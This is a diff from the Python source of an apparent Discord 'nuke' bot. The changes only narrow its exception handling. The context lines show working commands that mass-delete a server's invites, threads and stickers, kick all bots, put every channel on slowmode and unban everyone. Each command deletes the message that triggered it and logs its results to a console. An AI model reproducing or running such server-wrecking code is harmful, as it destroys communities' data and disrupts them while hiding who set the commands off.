+        except (discord.HTTPException, discord.NotFound):
             pass
 
         guild = ctx.guild
@@ -2385,7 +2460,7 @@ async def invite_nuke(ctx):
 
         try:
             await author.send(t("invite_nuke_starting"))
-        except:
+        except discord.Forbidden:
             pass
 
         invites = await guild.invites()
@@ -2395,7 +2470,7 @@ async def invite_nuke(ctx):
             try:
                 await invite.delete(reason=f"Invite nuke by {author}")
                 deleted += 1
-            except:
+            except Exception:
                 pass
 
         print(f'{Fore.RED}[INVITE-NUKE] {Fore.WHITE}Complete: {deleted} invites deleted in {guild.name}{Style.RESET_ALL}')
@@ -2423,7 +2498,7 @@ async def thread_nuke(ctx):
     try:
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         guild = ctx.guild
@@ -2433,7 +2508,7 @@ async def thread_nuke(ctx):
 
         try:
             await author.send(t("thread_nuke_starting"))
-        except:
+        except discord.Forbidden:
             pass
 
         deleted = 0
@@ -2442,7 +2517,7 @@ async def thread_nuke(ctx):
             try:
                 await thread.delete()
                 deleted += 1
-            except:
+            except Exception:
                 pass
 
         print(f'{Fore.RED}[THREAD-NUKE] {Fore.WHITE}Complete: {deleted} threads deleted in {guild.name}{Style.RESET_ALL}')
@@ -2470,7 +2545,7 @@ async def bot_nuke(ctx):
     try:
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         guild = ctx.guild
@@ -2486,7 +2561,7 @@ async def bot_nuke(ctx):
 
         try:
             await author.send(t("bot_nuke_starting"))
-        except:
+        except discord.Forbidden:
             pass
 
         kicked = 0
@@ -2495,7 +2570,7 @@ async def bot_nuke(ctx):
             try:
                 await member.kick(reason=f"Bot nuke by {author}")
                 kicked += 1
-            except:
+            except Exception:
                 pass
 
         print(f'{Fore.RED}[BOT-NUKE] {Fore.WHITE}Complete: {kicked} bots kicked in {guild.name}{Style.RESET_ALL}')
@@ -2527,7 +2602,7 @@ async def slowmode_all(ctx, seconds: int = 21600):
     try:
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         guild = ctx.guild
@@ -2537,7 +2612,7 @@ async def slowmode_all(ctx, seconds: int = 21600):
 
         try:
             await author.send(t("slowmode_all_starting", seconds=seconds))
-        except:
+        except discord.Forbidden:
             pass
 
         count = 0
@@ -2546,7 +2621,7 @@ async def slowmode_all(ctx, seconds: int = 21600):
             try:
                 await channel.edit(slowmode_delay=seconds, reason=f"Slowmode-all by {author}")
                 count += 1
-            except:
+            except Exception:
                 pass
 
         print(f'{Fore.YELLOW}[SLOWMODE-ALL] {Fore.WHITE}Complete: {count} channels updated in {guild.name}{Style.RESET_ALL}')
@@ -2574,7 +2649,7 @@ async def sticker_nuke(ctx):
     try:
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         guild = ctx.guild
@@ -2584,7 +2659,7 @@ async def sticker_nuke(ctx):
 
         try:
             await author.send(t("sticker_nuke_starting"))
-        except:
+        except discord.Forbidden:
             pass
 
         stickers = await guild.fetch_stickers()
@@ -2594,7 +2669,7 @@ async def sticker_nuke(ctx):
             try:
                 await sticker.delete(reason=f"Sticker nuke by {author}")
                 deleted += 1
-            except:
+            except Exception:
                 pass
 
         print(f'{Fore.RED}[STICKER-NUKE] {Fore.WHITE}Complete: {deleted} stickers deleted in {guild.name}{Style.RESET_ALL}')
@@ -2621,7 +2696,7 @@ async def server_backup(ctx):
     try:
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         guild = ctx.guild
@@ -2631,7 +2706,7 @@ async def server_backup(ctx):
 
         try:
             await author.send(t("server_backup_starting"))
-        except:
+        except discord.Forbidden:
             pass
 
         backup = {
@@ -2714,7 +2789,7 @@ async def unban_all(ctx):
     try:
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         guild = ctx.guild
@@ -2724,7 +2799,7 @@ async def unban_all(ctx):
 
         try:
             await author.send(t("unban_all_starting"))
-        except:
+        except discord.Forbidden:
             pass
 
         unbanned = 0
@@ -2733,7 +2808,7 @@ async def unban_all(ctx):
             try:
                 await guild.unban(ban_entry.user, reason=f"Unban-all by {author}")
                 unbanned += 1
-            except:
+            except Exception:
                 pass
 
         print(f'{Fore.YELLOW}[UNBAN-ALL] {Fore.WHITE}Complete: {unbanned} users unbanned in {guild.name}{Style.RESET_ALL}')
@@ -2759,7 +2834,7 @@ async def whitelist_add(ctx, user_id: int):
     """Add a user ID to the whitelist"""
     try:
         await ctx.message.delete()
-    except:
+    except (discord.HTTPException, discord.NotFound):
         pass
 
     whitelist = config.get("whitelist", [])
@@ -2792,7 +2867,7 @@ async def whitelist_remove(ctx, user_id: int):
     """Remove a user ID from the whitelist"""
     try:
         await ctx.message.delete()
-    except:
+    except (discord.HTTPException, discord.NotFound):
         pass
 
     whitelist = config.get("whitelist", [])
@@ -2825,7 +2900,7 @@ async def whitelist_list(ctx):
     """List all whitelisted user IDs"""
     try:
         await ctx.message.delete()
-    except:
+    except (discord.HTTPException, discord.NotFound):
         pass
 
     whitelist = config.get("whitelist", [])
